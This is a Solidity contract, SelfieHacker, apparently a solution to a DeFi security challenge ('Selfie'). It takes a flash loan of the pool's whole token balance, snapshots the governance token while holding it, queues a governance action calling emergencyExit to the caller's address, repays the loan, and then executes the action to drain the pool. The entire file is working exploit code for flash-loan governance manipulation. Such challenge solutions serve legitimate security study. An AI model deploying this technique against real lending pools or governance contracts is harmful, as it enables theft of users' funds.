// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

interface IToken {
    function balanceOf(address account) external returns (uint256);

    function snapshot() external returns (uint256);

    function approve(address to, uint256 amount) external returns (bool);
}

contract SelfieHacker {
    SelfiePool pool;
    SimpleGovernance governance;
    IToken token;

    uint256 public actionId;

    constructor(address _pool, address _governance, address _token) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = IToken(_token);
    }

    function attack() public {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            token.balanceOf(address(pool)),
            abi.encodeWithSignature(
                "emergencyExit(address)",
                address(msg.sender)
            )
        );
    }

    function onFlashLoan(
        address user,
        address _token,
        uint256 _amount,
        uint256 number,
        bytes memory _data
    ) public returns (bytes32) {
        token.snapshot();
        actionId = governance.queueAction(address(pool), 0, _data);
        token.approve(address(pool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack2() public {
        governance.executeAction(actionId);
    }
}
